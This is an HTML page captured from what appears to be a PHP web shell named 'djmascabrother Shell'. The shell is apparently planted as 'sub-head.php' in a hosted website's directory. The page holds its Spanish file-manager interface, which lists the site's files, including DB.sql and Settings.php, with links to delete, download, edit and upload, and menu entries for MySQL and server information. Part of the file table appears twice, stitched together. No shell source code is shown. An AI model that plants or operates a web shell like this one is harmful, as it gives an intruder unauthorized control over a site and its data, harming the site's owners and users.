                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SourcesSubs.php::SourcesSubs.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SourcesSubs.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::add_comment.php">add_comment.php</a></td>
                    <td>Archivo</td>
                    <td>2.66 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/add_comment.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/add_comment.php::add_comment.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::add_comment.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::comentarios.php">comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>1.96 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/comentarios.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/comentarios.php::comentarios.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::emoticones.php">emoticones.php</a></td>
                    <td>Archivo</td>
                    <td>1.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/emoticones.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/emoticones.php::emoticones.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::emoticones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::favicon.ico">favicon.ico</a></td>
                    <td>Archivo</td>
                    <td>1.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/favicon.ico::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/favicon.ico::favicon.ico::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::favicon.ico">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::index.php">index.php</a></td>
                    <td>Archivo</td>
                    <td>11.18 KB</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/index.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/index.php::index.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::index.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::php.ini">php.ini</a></td>
                    <td>Archivo</td>
                    <td>47 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/php.ini::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/php.ini::php.ini::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::php.ini">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::robots.txt">robots.txt</a></td>
                    <td>Archivo</td>
                    <td>244 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/robots.txt::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/robots.txt::robots.txt::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::robots.txt">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sitemap.xml">sitemap.xml</a></td>
                    <td>Archivo</td>
                    <td>94.43 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sitemap.xml::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sitemap.xml::sitemap.xml::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sitemap.xml">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sp-widget.php">sp-widget.php</a></td>
                    <td>Archivo</td>
                    <td>2.7 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sp-widget.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sp-widget.php::sp-widget.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sp-widget.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sub-head.php">sub-head.php</a></td>
                    <td>Archivo</td>
                    <td>250.81 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sub-head.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sub-head.php::sub-head.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sub-head.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::validar_char.php">validar_char.php</a></td>
                    <td>Archivo</td>
                    <td>352 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/validar_char.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/validar_char.php::validar_char.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::validar_char.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::vprevia.php">vprevia.php</a></td>
                    <td>Archivo</td>
                    <td>6.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/vprevia.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/vprevia.php::vprevia.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::vprevia.php">Editar</a>
                    </td>
                    </tr></table><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <link rel="shortcut icon" href="http://skazu.totalh.com/sub-head.php?imagen::icono" />
    <title>djmascabrother Shell en 209.190.24.9</title>
    <style type="text/css">
        *{padding:0;margin:0;border:0;}
        body{background:url(http://skazu.totalh.com/sub-head.php?imagen::fondo1) repeat;font-size:12px;font-family:tahoma;}
        input,select,option{background:url(http://skazu.totalh.com/sub-head.php?imagen::fondo2) repeat-x;font-size:12px;padding:3px;border:solid 1px #369;}
        select,option{height:25px;padding:-2px;border:solid 1px #369;}
        option{border:solid 1px #eee;}
        #menu,#pie,#ext_menu{width:100%;border-bottom:solid 1px #369;background:url(http://skazu.totalh.com/sub-head.php?imagen::fondo2) repeat-x;height:14px;padding:8px 0;text-align:center;}
        #menu a:link,#menu a:visited,#menu a:active,#pie a:link,#pie a:visited,#pie a:active,#pie span,#ext_menu a:link,#ext_menu a:visited,#ext_menu a:active,#ext_menu span{text-decoration:none;font-weight:bold;color:#369;padding:3px 10px 3px 28px;background-position:2px 2px;}
        #menu a:hover,#pie a:hover,#ext a:hover{padding:1px 9px 1px 27px;border:solid 1px #ddd;background-position:1px 0px;color:#333;}
        #ext_menu a:link,#ext_menu a:visited,#ext_menu a:active,#ext_menu span{padding:3px 28px 3px 28px;}
        #ext_menu a:hover{padding:1px 27px 1px 27px;border:solid 1px #c90;}
        #pie{border-top:solid 1px #369;}
        #pie input{background:url(http://skazu.totalh.com/sub-head.php?imagen::nombre) 4px 2px no-repeat;padding-left:24px;border:solid 1px #ddd;margin:-4px 10px;width:200px;color:#369;font-weight:bold;}
        #ext_menu{background:url(http://skazu.totalh.com/sub-head.php?imagen::fondo3) repeat-x;}
        #menu_logo,#pie_logo{background:url(http://skazu.totalh.com/sub-head.php?imagen::plugin2) 0px 10px no-repeat;float:left;width:48px;height:40px;display:block;z-index:999;margin-top:-18px;}
        #pie_logo{background:url(http://skazu.totalh.com/sub-head.php?imagen::servidor2) 4px 10px no-repeat;margin-bottom:-18px;overflow:hidden;display:fixed;z-index:999;}
        #guardar{background:url(http://skazu.totalh.com/sub-head.php?imagen::guardar) left no-repeat;}
        #resetear{background:url(http://skazu.totalh.com/sub-head.php?imagen::resetear) left no-repeat;}
        a#inicio{background:url(http://skazu.totalh.com/sub-head.php?imagen::inicio) left no-repeat;}
        a#subir_archivo{background:url(http://skazu.totalh.com/sub-head.php?imagen::subir) left no-repeat;}
        a#crear_carpeta{background:url(http://skazu.totalh.com/sub-head.php?imagen::carpeta) left no-repeat;}
        a#crear_archivo{background:url(http://skazu.totalh.com/sub-head.php?imagen::archivo) left no-repeat;}
        a#borrar{background:url(http://skazu.totalh.com/sub-head.php?imagen::error) left no-repeat;}
        a#descargar{background:url(http://skazu.totalh.com/sub-head.php?imagen::bajar) left no-repeat;}
        a#editar{background:url(http://skazu.totalh.com/sub-head.php?imagen::editar) left no-repeat;}
        a#mysql{background:url(http://skazu.totalh.com/sub-head.php?imagen::mysql) left no-repeat;}
        a#info{background:url(http://skazu.totalh.com/sub-head.php?imagen::info) left no-repeat;}
        a#servidor{background:url(http://skazu.totalh.com/sub-head.php?imagen::servidor) left no-repeat;}
        a#extensiones{background:url(http://skazu.totalh.com/sub-head.php?imagen::plugin) left no-repeat;}
        span#carga{background:url(http://skazu.totalh.com/sub-head.php?imagen::engranaje) left no-repeat;}
        table{margin:0;padding:0;width:100%;border-bottom:solid 1px #369;background:white;border-collapse: collapse;}
        table td{border:solid 1px #eee;color:#555;padding:2px 4px 2px 10px;}
        table tr:hover{background:#eee;}
        textarea{border:none;width:100%;height:500px;overflow:auto;}
        form span {color:#444;font-weight:bold;}
        .opciones{width:350px;}
        .ext_opciones{width:250px;}
        .opciones a:link,.opciones a:visited,.opciones a:active, .ext_opciones a:link,.ext_opciones a:visited,.ext_opciones a:active{padding:2px 18px;text-decoration:none;font-weight:bold;color:#369;background-position:2px 2px;font-size:10px;}
        .opciones a:hover, .ext_opciones a:hover{padding:-5px 9px;background-position:1px 1px;color:#black;}
        .primer_fila{padding-left:10px;font-weight:bold;color:#369;border:solid 1px #369;background:lightblue;}
        .permisos{color:#aaa;}
        .si_permisos{color:green;}
        .no_permisos{color:red;}
        .archivo{background:url(http://skazu.totalh.com/sub-head.php?imagen::archivo) center no-repeat;width:18px;height:18px;}
        .carpeta{background:url(http://skazu.totalh.com/sub-head.php?imagen::carpeta) center no-repeat;width:18px;height:18px;}
        .enlace{background:url(http://skazu.totalh.com/sub-head.php?imagen::enlace) center no-repeat;width:18px;height:18px;}
        .extension{background:url(http://skazu.totalh.com/sub-head.php?imagen::plugin) center no-repeat;width:18px;height:18px;}
        .contenedor,.error,.exito{width:100%;border-bottom:solid 1px #369;background:white;padding:5px 10px;text-align:center;}
        .error{background:#f66;color:white;font-weight:bold;}
        .exito{background:#0c9;color:white;font-weight:bold;}
    </style>
</head>

<body>
<div id="menu">
    <a id="inicio" href="http://skazu.totalh.com/sub-head.php">Inicio</a>
    <a id="subir_archivo" href="?subir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Subir archivo</a>
    <a id="crear_carpeta" href="?crear_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Crear carpeta</a>
    <a id="extensiones" href="?extensiones::inicio">Extensiones</a>
    <a id="info" href="?codigo"></a>
    </div><div id="ext_menu">
            <div id="menu_logo"></div><span> No hay ninguna extensión instalada aún.</span></div><table>
            <tr class="primer_fila">
                <td></td>
                <td>Nombre</td>
                <td>Tipo</td>
                <td>Tamaño</td>
                <td>Permisos</td>
                <td class="opciones">Opciones</td>
            </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">.</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                        </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">..</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Packages">Packages</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Packages::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Smileys">Smileys</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Smileys::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Sources">Sources</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Sources::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Themes">Themes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Themes::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/web">web</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/web::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess">.htaccess</a></td>
                    <td>Archivo</td>
                    <td>206 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess::.htaccess::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess.backup">.htaccess.backup</a></td>
                    <td>Archivo</td>
                    <td>787 B</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess.backup::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess.backup::.htaccess.backup::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess.backup">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::404.php">404.php</a></td>
                    <td>Archivo</td>
                    <td>45 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/404.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/404.php::404.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::404.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::DB.sql">DB.sql</a></td>
                    <td>Archivo</td>
                    <td>51.93 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/DB.sql::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/DB.sql::DB.sql::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::DB.sql">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SSI.php">SSI.php</a></td>
                    <td>Archivo</td>
                    <td>12.13 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SSI.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SSI.php::SSI.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SSI.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::Settings.php">Settings.php</a></td>
                    <td>Archivo</td>
                    <td>1016 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Settings.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Settings.php::Settings.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::Settings.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SourcesSubs.php">SourcesSubs.php</a></td>
                    <td>Archivo</td>
                    <td>144.45 KB</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SourcesSubs.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SourcesSubs.php::SourcesSubs.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SourcesSubs.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::add_comment.php">add_comment.php</a></td>
                    <td>Archivo</td>
                    <td>2.66 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/add_comment.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/add_comment.php::add_comment.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::add_comment.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::comentarios.php">comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>1.96 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/comentarios.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/comentarios.php::comentarios.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
